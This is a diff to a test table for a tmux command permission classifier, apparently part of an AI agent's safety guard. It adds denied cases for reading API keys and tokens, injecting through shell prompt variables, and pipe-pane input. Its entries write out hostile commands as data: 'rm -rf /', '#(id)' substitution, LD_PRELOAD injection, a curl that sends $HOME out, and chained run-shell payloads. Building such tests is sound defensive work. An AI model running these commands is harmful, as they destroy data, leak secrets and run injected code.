@@ -3037,7 +3037,9 @@ tmux confirm-before 'ls'	inert
 tmux confirm-before 'rm -rf /'	denied
 tmux detach-client	safe-write
 tmux display	inert
+tmux display -p '#{?OPENAI_API_KEY,set,unset}'	denied
 tmux display -p '#{E:@x}'	denied
+tmux display -p '#{OPENAI_API_KEY}'	denied
 tmux display -p '#{T;=10:@x}'	denied
 tmux display-message	inert
 tmux display-message -p '#(rm -rf /)'	denied
@@ -3064,15 +3066,22 @@ tmux list-windows	inert
 tmux load-buffer foo	denied
 tmux ls	inert
 tmux ls 'x;' run-shell 'rm -rf /'	denied
+tmux ls -F '#{session_name} #{GITHUB_TOKEN}'	denied
 tmux ls \\; run-shell 'rm -rf /'	denied
 tmux lsp	inert
 tmux lsw	inert
 tmux new	safe-write
 tmux new -d 'curl -s https://example.com/$HOME'	denied
+tmux new -d -e PROMPT=x	denied
+tmux new -d -e PROMPT_COMMAND='rm -rf ~'	denied
+tmux new -d -e PS1='$(id)'	denied
+tmux new -d -e RPROMPT=x	denied
+tmux new -d -ePS0=x	denied
 tmux new-session	safe-write
 tmux new-session 'rm -rf /'	denied
 tmux new-session -Q 'ls'	denied
 tmux new-session -d -P -F '#(id)'	denied
+tmux new-session -d -e PS2=x	denied
 tmux new-session -d -s work	safe-write
 tmux new-session -d -s work 'git status'	safe-write
 tmux new-session -d -s work \\; split-window -h \\; select-pane -t 0	safe-write
@@ -3085,8 +3094,10 @@ tmux new-window -n logs 'ls -la'	safe-write
 tmux new-window -n x 'rm -rf /'	denied
 tmux pipe-pane 'cat'	inert
 tmux pipe-pane 'rm -rf /'	denied
+tmux pipe-pane -I -t work 'printf x'	denied
 tmux pipe-pane -o /tmp/log 'cat'	inert
 tmux pipe-pane -o /tmp/log 'rm -rf /'	denied
+tmux pipep -I 'echo id'	denied
 tmux rename-session	safe-write
 tmux rename-window	safe-write
 tmux rename-window '#(id)'	denied
@@ -3125,16 +3136,26 @@ tmux set -gtwork default-command 'rm -rf /'	denied
 tmux set -s command-alias[100] x=run-shell	denied
 tmux set-environment	safe-write
 tmux set-environment -g LD_PRELOAD /tmp/x.so	denied
+tmux set-environment -g PS0 x	denied
+tmux set-environment -gF X '#(rm -rf ~)'	denied
+tmux set-environment PS1 x	denied
 tmux set-option	safe-write
 tmux set-option -g after-new-window 'run-shell id'	denied
 tmux set-option -g default-command 'rm -rf /'	denied
+tmux setenv -F X '#(id)'	denied
 tmux setenv -g EDITOR_THEME dark	safe-write
+tmux setenv -g PROMPT_COMMAND 'rm -rf ~'	denied
+tmux setenv -h PS4 x	denied
 tmux show	inert
-tmux show-environment	inert
+tmux show-environment	denied
+tmux show-environment -g OPENAI_API_KEY	denied
+tmux show-environment -h	denied
 tmux show-options	inert
-tmux showenv	inert
+tmux showenv	denied
+tmux showenv -g	denied
 tmux source-file ~/.tmux.conf	denied
 tmux split-window	safe-write
+tmux split-window -e PS4=x	denied
 tmux split-window -h 'rm -rf /'	denied
 tmux split-window -h -c . 'git log'	safe-write
 tmux splitw -dh -c . 'rm -rf /'	denied
